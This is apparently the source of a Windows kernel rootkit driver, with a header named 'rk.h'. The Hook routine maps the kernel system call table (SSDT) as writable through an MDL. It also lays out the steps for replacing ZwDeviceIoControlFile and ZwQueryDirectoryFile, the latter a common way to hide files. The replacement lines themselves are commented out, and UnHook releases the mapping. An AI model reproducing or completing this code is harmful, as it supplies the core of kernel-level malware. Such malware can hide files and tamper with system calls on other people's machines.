#include "rk.h"
#include "DefSystemVar.h"
#include "DefSSDT.h"

PVOID *pNewSystemCallTable;
PMDL pMyMDL;


NTSTATUS Hook()
{
	ULONG ulIndex;

	pMyMDL = NULL;
	pNewSystemCallTable = NULL;
	ulIndex = 0;

	pMyMDL = MmCreateMdl(NULL, \
		KeServiceDescriptorTable->Ntoskrnl.ServiceTableBase, \
		KeServiceDescriptorTable->Ntoskrnl.ulNumberOfServices * 4);
	if(NULL == pMyMDL)
	{
		return STATUS_UNSUCCESSFUL;
	}
	MmBuildMdlForNonPagedPool(pMyMDL);
	pMyMDL->MdlFlags = pMyMDL->MdlFlags | MDL_MAPPED_TO_SYSTEM_VA;
	pNewSystemCallTable = MmMapLockedPages(pMyMDL,KernelMode);
	if(NULL == pNewSystemCallTable)
	{
		return STATUS_UNSUCCESSFUL;
	}
	ulIndex = *(PULONG)((ULONG)ZwDeviceIoControlFile + 1);
	//g_OldZwDeviceIoControlFile = (PVOID)*(PULONG)((ULONG)pNewSystemCallTable + ulIndex * 4);
	//g_OldZwDeviceIoControlFile = (ZWDEVICECONTROLIOFILE)*(PULONG)((ULONG)pNewSystemCallTable + ulIndex * 4);
	//InterlockedExchange((PULONG)((ULONG)pNewSystemCallTable + ulIndex * 4),(LONG)NewZwDeviceIoControlFile);

	//ulIndex = *(PULONG)((ULONG)ZwQueryDirectoryFile + 1);
	//g_OrgialZwQueryDirectoryFile = (PVOID)*(PULONG)((ULONG)pNewSystemCallTable + ulIndex * 4);
	//g_OrgialZwQueryDirectoryFile = (ZWQUERYDIRECTORYFILE)*(PULONG)((ULONG)pNewSystemCallTable + ulIndex * 4);
	//InterlockedExchange((PULONG)((ULONG)pNewSystemCallTable + ulIndex * 4),(LONG)NewZwQueryDirectoryFile);
	//HOOK_SYSCALL(ulHookFnc,ulHookedFnc,pSaveFnc);

	return STATUS_SUCCESS;
}
NTSTATUS UnHook()
{
	ULONG ulIndex;
	if(pNewSystemCallTable)
	{
		//ulIndex = *(PULONG)((ULONG)ZwQueryDirectoryFile + 1);
		//InterlockedExchange((PULONG)((ULONG)pNewSystemCallTable + ulIndex * 4),(LONG)g_OrgialZwQueryDirectoryFile);

		ulIndex = *(PULONG)((ULONG)ZwDeviceIoControlFile + 1);
		//InterlockedExchange((PULONG)((ULONG)pNewSystemCallTable + ulIndex * 4),(LONG)g_OldZwDeviceIoControlFile);
		//UNHOOK_SYSCALL(ulHookFnc,pSaveFnc,ulHookedFnc);
		MmUnmapLockedPages(pNewSystemCallTable,pMyMDL);
		IoFreeMdl(pMyMDL);
	}
	return STATUS_SUCCESS;
}